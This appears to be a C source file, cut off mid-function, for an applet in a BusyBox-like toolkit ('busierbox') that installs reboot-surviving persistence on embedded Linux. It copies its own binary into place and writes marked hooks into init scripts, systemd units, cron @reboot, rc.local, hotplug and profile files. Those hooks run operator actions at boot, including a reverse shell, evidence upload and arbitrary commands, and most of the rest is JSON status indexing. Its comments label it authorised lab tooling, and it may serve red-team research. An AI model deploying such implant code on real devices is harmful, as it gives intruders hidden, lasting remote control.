#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include "applets.h"
#include "json_helpers.h"

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#ifndef BB_RECOVERY_BINARY_NAME
#define BB_RECOVERY_BINARY_NAME "busierbox_recovery"
#endif

struct recovery_method {
    const char *name;
    const char *path;
    const char *kind;
    const char *survives_reboot;
    const char *intrusiveness;
    const char *reversibility;
    const char *requires_external_write;
};

static const struct recovery_method recovery_methods[] = {
    {"openwrt-procd", "etc/init.d/busierbox_recovery", "OpenWrt/procd init script", "yes", "medium", "backup/remove script", "yes"},
    {"sysv-init", "etc/rc.d/S99busierbox_recovery", "SysV init.d/rcS hook", "yes", "medium", "backup/remove script", "yes"},
    {"systemd-unit", "etc/systemd/system/busierbox-recovery.service", "systemd unit", "yes", "medium", "backup/remove unit", "yes"},
    {"cron-reboot", "etc/crontabs/root", "cron @reboot line", "yes", "medium", "remove marked block", "yes"},
    {"at-job", "var/spool/at", "at job spool", "maybe", "high", "manual/provider-specific", "yes"},
    {"rc-local", "etc/rc.local", "rc.local marked block", "yes", "low", "remove marked block", "yes"},
    {"hotplug-iface", "etc/hotplug.d/iface/99-busierbox-recovery", "OpenWrt hotplug.d iface hook", "event", "medium", "remove script", "yes"},
    {"profile", "etc/profile.d/busierbox-recovery.sh", "shell profile hook", "login-only", "low", "remove script", "yes"},
};

struct recovery_storage {
    const char *path;
    const char *class_name;
    const char *survives_reboot;
    const char *notes;
};

static const struct recovery_storage recovery_storage_paths[] = {
    {"/overlay", "persistent", "yes", "OpenWrt writable overlay when present"},
    {"/root", "persistent", "yes", "root home on most installed systems"},
    {"/etc", "persistent", "yes", "configuration partition/rootfs overlay"},
    {"/usr/bin", "persistent", "yes", "binary location when rootfs is writable"},
    {"/tmp", "volatile", "no", "tmpfs on OpenWrt and most embedded Linux targets"},
    {"/var/tmp", "usually-volatile", "maybe", "may be tmpfs or persistent depending on target"},
    {"/dev/shm", "volatile", "no", "tmpfs shared memory"},
};

static const char *recovery_actions[] = {
    "status-only",
    "rshell",
    "evidence-push",
    "evidence-then-rshell",
    "dmesg-push",
    "command",
    "script",
    NULL
};

static int is_help(int argc, char **argv)
{
    return argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help") || !strcmp(argv[1], "help"));
}

static int path_exists(const char *path)
{
    return access(path, F_OK) == 0;
}

static const char *payload_base_name(const char *path)
{
    const char *slash;
    if (!path || !*path)
        return "persistence";
    slash = strrchr(path, '/');
    return slash ? slash + 1 : path;
}

static const struct recovery_method *find_recovery_method(const char *name)
{
    size_t i;
    if (!strcmp(name, "procd"))
        name = "openwrt-procd";
    else if (!strcmp(name, "rcS"))
        name = "sysv-init";
    else if (!strcmp(name, "systemd"))
        name = "systemd-unit";
    else if (!strcmp(name, "cron"))
        name = "cron-reboot";
    else if (!strcmp(name, "rc.local"))
        name = "rc-local";
    else if (!strcmp(name, "hotplug"))
        name = "hotplug-iface";
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++)
        if (!strcmp(recovery_methods[i].name, name))
            return &recovery_methods[i];
    return NULL;
}

static const char *recovery_action_category(const char *action)
{
    if (!strcmp(action, "evidence-push") || !strcmp(action, "evidence-then-rshell") || !strcmp(action, "dmesg-push"))
        return "evidence";
    if (!strcmp(action, "rshell"))
        return "reverse-shell";
    if (!strcmp(action, "command"))
        return "command";
    if (!strcmp(action, "script"))
        return "script";
    return "status";
}

static int recovery_action_uploads_evidence(const char *action)
{
    return !strcmp(action, "evidence-push") || !strcmp(action, "evidence-then-rshell") || !strcmp(action, "dmesg-push");
}

static int recovery_action_collects_dmesg(const char *action)
{
    return !strcmp(action, "dmesg-push");
}

static int recovery_action_starts_rshell(const char *action)
{
    return !strcmp(action, "rshell") || !strcmp(action, "evidence-then-rshell");
}

static int recovery_action_starts_rshell_after_evidence(const char *action)
{
    return !strcmp(action, "evidence-then-rshell");
}

static int recovery_action_executes_operator_supplied_command(const char *action)
{
    return !strcmp(action, "command") || !strcmp(action, "script");
}

static void recovery_join(char *out, size_t outsz, const char *root, const char *rel)
{
    if (!root || !*root || !strcmp(root, "/"))
        snprintf(out, outsz, "/%s", rel);
    else
        snprintf(out, outsz, "%s/%s", root, rel);
}

static void recovery_bin_path(char *out, size_t outsz, const char *root, const char *name)
{
    char rel[PATH_MAX];
    snprintf(rel, sizeof(rel), "usr/bin/%s", name);
    recovery_join(out, outsz, root, rel);
}

static void recovery_script_path(char *out, size_t outsz, const char *root, const char *name)
{
    char rel[PATH_MAX];
    snprintf(rel, sizeof(rel), "usr/bin/%s.recovery.sh", name);
    recovery_join(out, outsz, root, rel);
}

static void fprint_shell_quoted(FILE *fp, const char *s)
{
    fputc('\'', fp);
    for (; s && *s; s++) {
        if (*s == '\'')
            fputs("'\\''", fp);
        else
            fputc(*s, fp);
    }
    fputc('\'', fp);
}

static int file_is_empty_or_missing(const char *path)
{
    struct stat st;
    if (stat(path, &st) != 0)
        return errno == ENOENT ? 1 : 0;
    return st.st_size == 0;
}

static int copy_self_to(const char *dst, const char *argv0)
{
    char src[PATH_MAX];
    FILE *in, *out;
    char buf[8192];
    size_t n;
    ssize_t len = readlink("/proc/self/exe", src, sizeof(src) - 1);

    if (len < 0) {
        if (!argv0 || !*argv0)
            return -1;
        snprintf(src, sizeof(src), "%s", argv0);
    } else {
        src[len] = '\0';
    }
    in = fopen(src, "rb");
    if (!in)
        return -1;
    out = fopen(dst, "wb");
    if (!out) {
        fclose(in);
        return -1;
    }
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        if (fwrite(buf, 1, n, out) != n) {
            fclose(in);
            fclose(out);
            return -1;
        }
    }
    fclose(in);
    if (fclose(out) != 0)
        return -1;
    chmod(dst, 0755);
    return 0;
}

static int copy_file_path(const char *src, const char *dst)
{
    FILE *in, *out;
    char buf[8192];
    size_t n;
    in = fopen(src, "rb");
    if (!in)
        return -1;
    out = fopen(dst, "wb");
    if (!out) {
        fclose(in);
        return -1;
    }
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        if (fwrite(buf, 1, n, out) != n) {
            fclose(in);
            fclose(out);
            return -1;
        }
    }
    fclose(in);
    return fclose(out);
}

static int shell_name_safe(const char *s)
{
    size_t i;
    if (!s || !*s)
        return 0;
    for (i = 0; s[i]; i++) {
        unsigned char c = (unsigned char)s[i];
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '_' || c == '-' || c == '.'))
            return 0;
    }
    return 1;
}

static const char *first_nonempty_env(const char *a, const char *b)
{
    const char *v = getenv(a);
    if (v && v[0])
        return v;
    v = getenv(b);
    return v && v[0] ? v : NULL;
}

static void clean_recovery_arg_value(const char *in, char *out, size_t outsz)
{
    size_t i, j = 0;
    if (!outsz)
        return;
    for (i = 0; in && in[i] && j + 1 < outsz; i++) {
        if (in[i] == '\r' || in[i] == '\n')
            continue;
        out[j++] = in[i];
    }
    out[j] = '\0';
}

static int shell_word_safe(const char *s)
{
    size_t i;
    if (!s || !*s)
        return 0;
    for (i = 0; s[i]; i++) {
        unsigned char c = (unsigned char)s[i];
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == '_' || c == '-' ||
              c == '.' || c == '/' || c == ':' || c == '@' || c == ','))
            return 0;
    }
    return 1;
}

static int append_shell_word(char *out, size_t outsz, const char *word)
{
    size_t len = strlen(out);
    const char *p;
    if (len + 1 >= outsz)
        return -1;
    if (shell_word_safe(word)) {
        if (snprintf(out + len, outsz - len, "%s", word) >= (int)(outsz - len))
            return -1;
        return 0;
    }
    out[len++] = '\'';
    out[len] = '\0';
    for (p = word; p && *p; p++) {
        if (*p == '\'') {
            if (len + 4 >= outsz)
                return -1;
            memcpy(out + len, "'\\''", 4);
            len += 4;
            out[len] = '\0';
        } else {
            if (len + 1 >= outsz)
                return -1;
            out[len++] = *p;
            out[len] = '\0';
        }
    }
    if (len + 1 >= outsz)
        return -1;
    out[len++] = '\'';
    out[len] = '\0';
    return 0;
}

static int append_upload_target_arg(char *out, size_t outsz, const char *opt, const char *value)
{
    size_t len;
    if (!value || !value[0])
        return 0;
    len = strlen(out);
    if (snprintf(out + len, outsz - len, " %s ", opt) >= (int)(outsz - len))
        return -1;
    return append_shell_word(out, outsz, value);
}

static const char *skip_shell_spaces(const char *p)
{
    while (p && (*p == ' ' || *p == '\t'))
        p++;
    return p;
}

static int read_shell_word_value(const char **cursor, char *out, size_t outsz)
{
    const char *p = skip_shell_spaces(*cursor);
    size_t j = 0;
    int quoted = 0;

    if (!outsz)
        return -1;
    out[0] = '\0';
    while (p && *p) {
        if (!quoted && (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n'))
            break;
        if (*p == '\'') {
            quoted = !quoted;
            p++;
            continue;
        }
        if (!quoted && *p == '\\' && p[1])
            p++;
        if (j + 1 >= outsz)
            return -1;
        out[j++] = *p++;
    }
    out[j] = '\0';
    *cursor = p;
    return j ? 0 : -1;
}

static int extract_shell_option_value(const char *command, const char *opt, char *out, size_t outsz)
{
    const char *p = command;
    size_t optlen = strlen(opt);

    if (outsz)
        out[0] = '\0';
    while (p && (p = strstr(p, opt)) != NULL) {
        if ((p == command || p[-1] == ' ' || p[-1] == '\t') &&
            (p[optlen] == ' ' || p[optlen] == '\t')) {
            p += optlen;
            return read_shell_word_value(&p, out, outsz);
        }
        p += optlen;
    }
    return -1;
}

static int extract_next_shell_option_value(const char **cursor, const char *opt, char *out, size_t outsz)
{
    const char *p = *cursor;
    size_t optlen = strlen(opt);

    if (outsz)
        out[0] = '\0';
    while (p && (p = strstr(p, opt)) != NULL) {
        if ((*cursor == p || p[-1] == ' ' || p[-1] == '\t') &&
            (p[optlen] == ' ' || p[optlen] == '\t')) {
            p += optlen;
            if (read_shell_word_value(&p, out, outsz) != 0)
                return -1;
            *cursor = p;
            return 0;
        }
        p += optlen;
    }
    *cursor = p ? p : "";
    return -1;
}

static void recovery_command_target_id(const char *command, char *out, size_t outsz)
{
    extract_shell_option_value(command, "--target-id", out, outsz);
}

static void recovery_command_target_label(const char *command, char *out, size_t outsz)
{
    extract_shell_option_value(command, "--target-label", out, outsz);
}

static void recovery_print_target_aliases_json(const char *command)
{
    const char *cursor = command;
    char alias[256];
    int first = 1;

    fputc('[', stdout);
    while (extract_next_shell_option_value(&cursor, "--target-alias", alias, sizeof(alias)) == 0) {
        fputs(first ? "" : ",", stdout);
        bb_json_string(stdout, alias);
        first = 0;
    }
    fputc(']', stdout);
}

static int recovery_command_has_target_alias(const char *command, const char *value)
{
    const char *cursor = command;
    char alias[256];

    while (extract_next_shell_option_value(&cursor, "--target-alias", alias, sizeof(alias)) == 0) {
        if (!strcmp(alias, value))
            return 1;
    }
    return 0;
}

static int recovery_command_has_any_target_alias(const char *command)
{
    const char *cursor = command;
    char alias[256];

    return extract_next_shell_option_value(&cursor, "--target-alias", alias, sizeof(alias)) == 0 && alias[0];
}

static int backup_existing_file(const char *path, char *backup, size_t backupsz)
{
    struct stat st;
    if (stat(path, &st) != 0)
        return 0;
    snprintf(backup, backupsz, "%s.busierbox.bak.%ld", path, (long)time(NULL));
    if (copy_file_path(path, backup) != 0)
        return -1;
    chmod(backup, st.st_mode & 0777);
    return 1;
}

static int append_recovery_block(const char *path, const char *method, const char *name,
                                 const char *action, const char *command)
{
    FILE *fp = fopen(path, "a");
    if (!fp)
        return -1;
    if (file_is_empty_or_missing(path)) {
        if (!strcmp(method, "openwrt-procd"))
            fputs("#!/bin/sh /etc/rc.common\nSTART=99\n\n", fp);
        else if (!strcmp(method, "sysv-init") || !strcmp(method, "rc-local") || !strcmp(method, "hotplug-iface") || !strcmp(method, "profile"))
            fputs("#!/bin/sh\n", fp);
    }
    fprintf(fp, "\n# BEGIN BUSIERBOX RECOVERY %s\n", name);
    fprintf(fp, "# method=%s; action=%s; authorized lab persistence/recovery hook\n", method, action);
    fprintf(fp, "# generated_command=%s\n", command);
    if (!strcmp(method, "cron-reboot")) {
        fputs("@reboot /bin/sh -c ", fp);
        fprint_shell_quoted(fp, command);
        fputs(" >/dev/null 2>&1\n", fp);
    }
    else if (!strcmp(method, "systemd-unit")) {
        fputs("[Unit]\nDescription=BusierBox authorized lab recovery action\n[Service]\nType=oneshot\nExecStart=/bin/sh -c ", fp);
        fprint_shell_quoted(fp, command);
        fputs("\n[Install]\nWantedBy=multi-user.target\n", fp);
    } else if (!strcmp(method, "openwrt-procd")) {
        fputs("start_service() {\n    /bin/sh -c ", fp);
        fprint_shell_quoted(fp, command);
        fputs(" >/dev/null 2>&1 &\n}\n", fp);
    } else {
        fputs("/bin/sh -c ", fp);
        fprint_shell_quoted(fp, command);
        fputs(" >/dev/null 2>&1 || true\n", fp);
    }
    fprintf(fp, "# END BUSIERBOX RECOVERY %s\n", name);
    return fclose(fp);
}

static int remove_recovery_block(const char *path, const char *name)
{
    char begin[256], end[256], tmp[PATH_MAX];
    FILE *in, *out;
    char line[4096];
    int skipping = 0, removed = 0;

    snprintf(begin, sizeof(begin), "BEGIN BUSIERBOX RECOVERY %s", name);
    snprintf(end, sizeof(end), "END BUSIERBOX RECOVERY %s", name);
    snprintf(tmp, sizeof(tmp), "%s.tmp.%ld", path, (long)getpid());
    in = fopen(path, "r");
    if (!in)
        return errno == ENOENT ? 0 : -1;
    out = fopen(tmp, "w");
    if (!out) {
        fclose(in);
        return -1;
    }
    while (fgets(line, sizeof(line), in)) {
        if (strstr(line, begin)) {
            skipping = 1;
            removed = 1;
            continue;
        }
        if (skipping) {
            if (strstr(line, end))
                skipping = 0;
            continue;
        }
        fputs(line, out);
    }
    fclose(in);
    if (fclose(out) != 0)
        return -1;
    if (!removed) {
        unlink(tmp);
        return 0;
    }
    if (rename(tmp, path) != 0) {
        unlink(tmp);
        return -1;
    }
    return 0;
}

static int recovery_status_one(const char *root, const struct recovery_method *m, const char *name,
                               char *action, size_t actionsz,
                               char *command, size_t commandsz)
{
    char path[PATH_MAX];
    char marker[256];
    char *text;
    char *begin, *end, *line;
    recovery_join(path, sizeof(path), root, m->path);
    snprintf(marker, sizeof(marker), "BEGIN BUSIERBOX RECOVERY %s", name);
    text = bb_read_text_file(path, 1024 * 1024);
    if (!text)
        return 0;
    begin = strstr(text, marker);
    if (begin) {
        end = strstr(begin, "END BUSIERBOX RECOVERY");
        if (action && actionsz)
            action[0] = '\0';
        if (command && commandsz)
            command[0] = '\0';
        line = begin;
        while (line && (!end || line < end)) {
            char *next = strchr(line, '\n');
            if (next)
                *next = '\0';
            if (action && actionsz) {
                char *p = strstr(line, "action=");
                if (p) {
                    char *q;
                    p += 7;
                    q = strchr(p, ';');
                    if (!q)
                        q = p + strcspn(p, " \t\r\n");
                    snprintf(action, actionsz, "%.*s", (int)(q - p), p);
                }
            }
            if (command && commandsz) {
                const char *p = strstr(line, "# generated_command=");
                if (p)
                    snprintf(command, commandsz, "%s", p + 20);
            }
            if (!next)
                break;
            *next = '\n';
            line = next + 1;
        }
        free(text);
        return 1;
    }
    free(text);
    return 0;
}

static int recovery_status_index_match(const char *root, const char *name,
                                       const char *kind, const struct recovery_method *m,
                                       const char *action, const char *command,
                                       const char *value)
{
    char key[128], path[PATH_MAX], bin[PATH_MAX], script[PATH_MAX];
    if (!strcmp(kind, "method"))
        return !strcmp(m->name, value);
    if (!strcmp(kind, "action"))
        return !strcmp(action, value);
    if (!strcmp(kind, "category"))
        return !strcmp(recovery_action_category(action), value);
    if (!strcmp(kind, "method_action")) {
        snprintf(key, sizeof(key), "%s:%s", m->name, action);
        return !strcmp(key, value);
    }
    if (!strcmp(kind, "category_action")) {
        snprintf(key, sizeof(key), "%s:%s", recovery_action_category(action), action);
        return !strcmp(key, value);
    }
    if (!strcmp(kind, "uploads_evidence"))
        return !strcmp(recovery_action_uploads_evidence(action) ? "yes" : "no", value);
    if (!strcmp(kind, "collects_dmesg"))
        return !strcmp(recovery_action_collects_dmesg(action) ? "yes" : "no", value);
    if (!strcmp(kind, "starts_rshell"))
        return !strcmp(recovery_action_starts_rshell(action) ? "yes" : "no", value);
    if (!strcmp(kind, "starts_rshell_after_evidence"))
        return !strcmp(recovery_action_starts_rshell_after_evidence(action) ? "yes" : "no", value);
    if (!strcmp(kind, "executes_operator_supplied_command"))
        return !strcmp(recovery_action_executes_operator_supplied_command(action) ? "yes" : "no", value);
    if (!strcmp(kind, "command_queue_enabled"))
        return !strcmp("no", value);
    if (!strcmp(kind, "hidden_control_channel"))
        return !strcmp("no", value);
    if (!strcmp(kind, "requires_external_write"))
        return !strcmp(m->requires_external_write, value);
    if (!strcmp(kind, "survives_reboot"))
        return !strcmp(m->survives_reboot, value);
    if (!strcmp(kind, "target_id")) {
        char target_id[256];
        recovery_command_target_id(command, target_id, sizeof(target_id));
        return target_id[0] && !strcmp(target_id, value);
    }
    if (!strcmp(kind, "target_label")) {
        char target_label[256];
        recovery_command_target_label(command, target_label, sizeof(target_label));
        return target_label[0] && !strcmp(target_label, value);
    }
    if (!strcmp(kind, "target_alias"))
        return recovery_command_has_target_alias(command, value);
    if (!strcmp(kind, "hook_present")) {
        recovery_join(path, sizeof(path), root, m->path);
        return !strcmp(path_exists(path) ? "yes" : "no", value);
    }
    if (!strcmp(kind, "binary_present")) {
        recovery_bin_path(bin, sizeof(bin), root, name);
        return !strcmp(path_exists(bin) ? "yes" : "no", value);
    }
    if (!strcmp(kind, "script_present")) {
        recovery_script_path(script, sizeof(script), root, name);
        return !strcmp(path_exists(script) ? "yes" : "no", value);
    }
    return 0;
}

static int recovery_print_status_index_array(const char *root, const char *name,
                                             const char *kind, const char *value)
{
    size_t j;
    int installed_index = 0;
    int first = 1;
    int matched = 0;

    fputc('[', stdout);
    for (j = 0; j < sizeof(recovery_methods) / sizeof(recovery_methods[0]); j++) {
        char action[64], generated[PATH_MAX * 2];
        if (!recovery_status_one(root, &recovery_methods[j], name, action, sizeof(action), generated, sizeof(generated)))
            continue;
        if (recovery_status_index_match(root, name, kind, &recovery_methods[j], action[0] ? action : "unknown", generated, value)) {
            printf("%s%d", first ? "" : ",", installed_index);
            first = 0;
            matched = 1;
        }
        installed_index++;
    }
    fputc(']', stdout);
    return matched;
}

static int recovery_status_index_has_match(const char *root, const char *name,
                                           const char *kind, const char *value)
{
    size_t j;
    for (j = 0; j < sizeof(recovery_methods) / sizeof(recovery_methods[0]); j++) {
        char action[64], generated[PATH_MAX * 2];
        if (!recovery_status_one(root, &recovery_methods[j], name, action, sizeof(action), generated, sizeof(generated)))
            continue;
        if (recovery_status_index_match(root, name, kind, &recovery_methods[j], action[0] ? action : "unknown", generated, value))
            return 1;
    }
    return 0;
}

static void recovery_print_status_yes_no_index(const char *root, const char *name,
                                               const char *json_key, const char *kind)
{
    static const char *yes_no[] = {"yes", "no", NULL};
    size_t i;
    int first = 1;

    fputs(",", stdout);
    bb_json_string(stdout, json_key);
    fputs(":{", stdout);
    for (i = 0; yes_no[i]; i++) {
        if (!recovery_status_index_has_match(root, name, kind, yes_no[i]))
            continue;
        fputs(first ? "" : ",", stdout);
        bb_json_string(stdout, yes_no[i]);
        fputc(':', stdout);
        recovery_print_status_index_array(root, name, kind, yes_no[i]);
        first = 0;
    }
    fputs("}", stdout);
}

static int value_seen(char values[][256], int count, const char *value)
{
    int i;
    for (i = 0; i < count; i++)
        if (!strcmp(values[i], value))
            return 1;
    return 0;
}

static void recovery_collect_status_target_values(const char *root, const char *name,
                                                  const char *kind,
                                                  char values[][256], int *count, int max_count)
{
    size_t j;

    *count = 0;
    for (j = 0; j < sizeof(recovery_methods) / sizeof(recovery_methods[0]); j++) {
        char action[64], generated[PATH_MAX * 2], value[256];
        if (!recovery_status_one(root, &recovery_methods[j], name, action, sizeof(action), generated, sizeof(generated)))
            continue;
        if (!strcmp(kind, "target_id")) {
            recovery_command_target_id(generated, value, sizeof(value));
            if (!value[0])
                continue;
            if (!value_seen(values, *count, value) && *count < max_count)
                snprintf(values[(*count)++], 256, "%s", value);
        } else if (!strcmp(kind, "target_label")) {
            recovery_command_target_label(generated, value, sizeof(value));
            if (!value[0])
                continue;
            if (!value_seen(values, *count, value) && *count < max_count)
                snprintf(values[(*count)++], 256, "%s", value);
        } else if (!strcmp(kind, "target_alias")) {
            const char *cursor = generated;
            while (extract_next_shell_option_value(&cursor, "--target-alias", value, sizeof(value)) == 0) {
                if (!value[0])
                    continue;
                if (!value_seen(values, *count, value) && *count < max_count)
                    snprintf(values[(*count)++], 256, "%s", value);
            }
        }
    }
}

static void recovery_print_status_target_index(const char *root, const char *name,
                                               const char *json_key, const char *kind)
{
    char values[64][256];
    int count, i;

    recovery_collect_status_target_values(root, name, kind, values, &count, 64);
    fputs(",", stdout);
    bb_json_string(stdout, json_key);
    fputs(":{", stdout);
    for (i = 0; i < count; i++) {
        fputs(i ? "," : "", stdout);
        bb_json_string(stdout, values[i]);
        fputc(':', stdout);
        recovery_print_status_index_array(root, name, kind, values[i]);
    }
    fputs("}", stdout);
}

static void recovery_print_status_indexes(const char *root, const char *name)
{
    static const char *categories[] = {
        "status", "reverse-shell", "evidence", "command", "script", NULL
    };
    size_t i;
    int first;

    fputs(",\"installations_by_method\":{", stdout);
    first = 1;
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
        if (!recovery_status_index_has_match(root, name, "method", recovery_methods[i].name))
            continue;
        fputs(first ? "" : ",", stdout);
        bb_json_string(stdout, recovery_methods[i].name);
        fputc(':', stdout);
        recovery_print_status_index_array(root, name, "method", recovery_methods[i].name);
        first = 0;
    }
    fputs("}", stdout);
    fputs(",\"installations_by_action\":{", stdout);
    first = 1;
    for (i = 0; recovery_actions[i]; i++) {
        if (!recovery_status_index_has_match(root, name, "action", recovery_actions[i]))
            continue;
        fputs(first ? "" : ",", stdout);
        bb_json_string(stdout, recovery_actions[i]);
        fputc(':', stdout);
        recovery_print_status_index_array(root, name, "action", recovery_actions[i]);
        first = 0;
    }
    fputs("}", stdout);
    fputs(",\"installations_by_category\":{", stdout);
    first = 1;
    for (i = 0; categories[i]; i++) {
        if (!recovery_status_index_has_match(root, name, "category", categories[i]))
            continue;
        fputs(first ? "" : ",", stdout);
        bb_json_string(stdout, categories[i]);
        fputc(':', stdout);
        recovery_print_status_index_array(root, name, "category", categories[i]);
        first = 0;
    }
    fputs("}", stdout);
    fputs(",\"installations_by_method_action\":{", stdout);
    first = 1;
    for (i = 0; i < sizeof(recovery_methods) / sizeof(recovery_methods[0]); i++) {
        size_t a;
        for (a = 0; recovery_actions[a]; a++) {
            char key[128];
            snprintf(key, sizeof(key), "%s:%s", recovery_methods[i].name, recovery_actions[a]);
            if (!recovery_status_index_has_match(root, name, "method_action", key))
                continue;
            fputs(first ? "" : ",", stdout);
            bb_json_string(stdout, key);
            fputc(':', stdout);
            recovery_print_status_index_array(root, name, "method_action", key);
            first = 0;
        }
    }
    fputs("}", stdout);
    fputs(",\"installations_by_category_action\":{", stdout);
    first = 1;
    for (i = 0; categories[i]; i++) {
        size_t a;
        for (a = 0; recovery_actions[a]; a++) {
            char key[128];
            snprintf(key, sizeof(key), "%s:%s", categories[i], recovery_actions[a]);
            if (!recovery_status_index_has_match(root, name, "category_action", key))
                continue;
            fputs(first ? "" : ",", stdout);
            bb_json_string(stdout, key);
            fputc(':', stdout);
            recovery_print_status_index_array(root, name, "category_action", key);
            first = 0;
        }
    }
    fputs("}", stdout);
    recovery_print_status_yes_no_index(root, name, "installations_by_uploads_evidence", "uploads_evidence");
    recovery_print_status_yes_no_index(root, name, "installations_by_collects_dmesg", "collects_dmesg");
    recovery_print_status_yes_no_index(root, name, "installations_by_starts_rshell", "starts_rshell");
    recovery_print_status_yes_no_index(root, name, "installations_by_starts_rshell_after_evidence", "starts_rshell_after_evidence");
    recovery_print_status_yes_no_index(root, name, "installations_by_executes_operator_supplied_command", "executes_operator_supplied_command");
    recovery_print_status_yes_no_index(root, name, "installations_by_command_queue_enabled", "command_queue_enabled");
    recovery_print_status_yes_no_index(root, name, "installations_by_hidden_control_channel", "hidden_control_channel");
    recovery_print_status_yes_no_index(root, name, "installations_by_requires_external_write", "requires_external_write");
    recovery_print_status_target_index(root, name, "installations_by_target_id", "target_id");
    recovery_print_status_target_index(root, name, "installations_by_target_label", "target_label");
    recovery_print_status_target_index(root, name, "installations_by_target_alias", "target_alias");
    recovery_print_status_yes_no_index(root, name, "installations_by_hook_present", "hook_present");
    recovery_print_status_yes_no_index(root, name, "installations_by_binary_present", "binary_present");
    recovery_print_status_yes_no_index(root, name, "installations_by_script_present", "script_present");
    fputs(",\"installations_by_survives_reboot\":{", stdout);
    first = 1;
    {
        static const char *survives[] = {"yes", "event", "login-only", "maybe", NULL};
        for (i = 0; survives[i]; i++) {
            if (!recovery_status_index_has_match(root, name, "survives_reboot", survives[i]))
                continue;
            fputs(first ? "" : ",", stdout);
            bb_json_string(stdout, survives[i]);
            fputc(':', stdout);
            recovery_print_status_index_array(root, name, "survives_reboot", survives[i]);
            first = 0;
        }
    }
    fputs("}", stdout);
}

static void recovery_print_status_api_collections(int installed_count)
{
    printf(",\"api_collections\":{\"installations\":{\"name\":\"installations\",\"count\":%d,\"count_summary_key\":\"summary.installation_count\",\"primary_key\":\"method\",\"summary_key\":\"summary.installation_count\",\"indexes\":[", installed_count);
    fputs("\"installations_by_method\",", stdout);
    fputs("\"installations_by_action\",", stdout);
    fputs("\"installations_by_category\",", stdout);
    fputs("\"installations_by_method_action\",", stdout);
    fputs("\"installations_by_category_action\",", stdout);
    fputs("\"installations_by_uploads_evidence\",", stdout);
    fputs("\"installations_by_collects_dmesg\",", stdout);
    fputs("\"installations_by_starts_rshell\",", stdout);
    fputs("\"installations_by_starts_rshell_after_evidence\",", stdout);
    fputs("\"installations_by_executes_operator_supplied_command\",", stdout);
    fputs("\"installations_by_command_queue_enabled\",", stdout);
    fputs("\"installations_by_hidden_control_channel\",", stdout);
    fputs("\"installations_by_requires_external_write\",", stdout);
    fputs("\"installations_by_target_id\",", stdout);
    fputs("\"installations_by_target_label\",", stdout);
    fputs("\"installations_by_target_alias\",", stdout);
    fputs("\"installations_by_hook_present\",", stdout);
    fputs("\"installations_by_binary_present\",", stdout);
    fputs("\"installations_by_script_present\",", stdout);
    fputs("\"installations_by_survives_reboot\"", stdout);
    fputs("]}}", stdout);
}

static void recovery_print_api_resource_object(const char *name, int count,
                                               const char *summary_key,
                                               const char *primary_key,
                                               const char *indexes_json)
{
    fputs("{\"name\":", stdout);
    bb_json_string(stdout, name);
    fputs(",\"collection_key\":", stdout);
    fputs("\"api_collections.", stdout);
    fputs(name, stdout);
    fputs("\"", stdout);
    fputs(",\"records_key\":", stdout);
    bb_json_string(stdout, name);
    printf(",\"count\":%d", count);
    fputs(",\"summary_key\":", stdout);
    bb_json_string(stdout, summary_key);
    fputs(",\"count_summary_key\":", stdout);
    bb_json_string(stdout, summary_key);
    fputs(",\"primary_key\":", stdout);
    bb_json_string(stdout, primary_key);
    fputs(",\"indexes\":[", stdout);
    fputs(indexes_json, stdout);
    fputs("]}", stdout);
}

static void recovery_print_api_resources(int storage_count, int method_count,
                                         int action_count, int installed_count)
{
    const char *storage_indexes = "\"storage_by_class\",\"storage_by_survives_reboot\"";
    const char *method_indexes = "\"methods_by_name\",\"methods_by_survives_reboot\",\"methods_by_intrusiveness\",\"methods_by_requires_external_write\"";
    const char *action_indexes = "\"actions_by_name\",\"actions_by_category\",\"actions_by_uploads_evidence\",\"actions_by_collects_dmesg\",\"actions_by_starts_rshell\",\"actions_by_starts_rshell_after_evidence\",\"actions_by_executes_operator_supplied_command\",\"actions_by_command_queue_enabled\",\"actions_by_hidden_control_channel\",\"actions_by_requires_explicit_apply\",\"actions_by_requires_external_write\"";
    const char *installation_indexes = "\"installations_by_method\",\"installations_by_action\",\"installations_by_category\",\"installations_by_method_action\",\"installations_by_category_action\",\"installations_by_uploads_evidence\",\"installations_by_collects_dmesg\",\"installations_by_starts_rshell\",\"installations_by_starts_rshell_after_evidence\",\"installations_by_executes_operator_supplied_command\",\"installations_by_command_queue_enabled\",\"installations_by_hidden_control_channel\",\"installations_by_requires_external_write\",\"installations_by_target_id\",\"installations_by_target_label\",\"installations_by_target_alias\",\"installations_by_hook_present\",\"installations_by_binary_present\",\"installations_by_script_present\",\"installations_by_survives_reboot\"";
    int is_status = installed_count >= 0;
    int resource_count = is_status ? 1 : 3;

    printf(",\"api\":{\"schema\":1,\"resources_key\":\"api_resources\",\"collections_key\":\"api_collections\",\"resource_count\":%d}", resource_count);
    fputs(",\"api_resources\":[", stdout);
    if (is_status) {
        recovery_print_api_resource_object("installations", installed_count, "summary.installation_count", "method", installation_indexes);
    } else {
        recovery_print_api_resource_object("storage", storage_count, "summary.storage_count", "path", storage_indexes);
        fputc(',', stdout);
        recovery_print_api_resource_object("methods", method_count, "summary.method_count", "name", method_indexes);
        fputc(',', stdout);
        recovery_print_api_resource_object("actions", action_count, "summary.action_count", "name", action_indexes);
    }
    fputs("],\"api_resources_by_name\":{", stdout);
    if (is_status) {
        fputs("\"installations\":", stdout);
        recovery_print_api_resource_object("installations", installed_count, "summary.installation_count", "method", installation_indexes);
    } else {
        fputs("\"storage\":", stdout);
        recovery_print_api_resource_object("storage", storage_count, "summary.storage_count", "path", storage_indexes);
        fputs(",\"methods\":", stdout);
        recovery_print_api_resource_object("methods", method_count, "summary.method_count", "name", method_indexes);
        fputs(",\"actions\":", stdout);
        recovery_print_api_resource_object("actions", action_count, "summary.action_count", "name", action_indexes);
    }
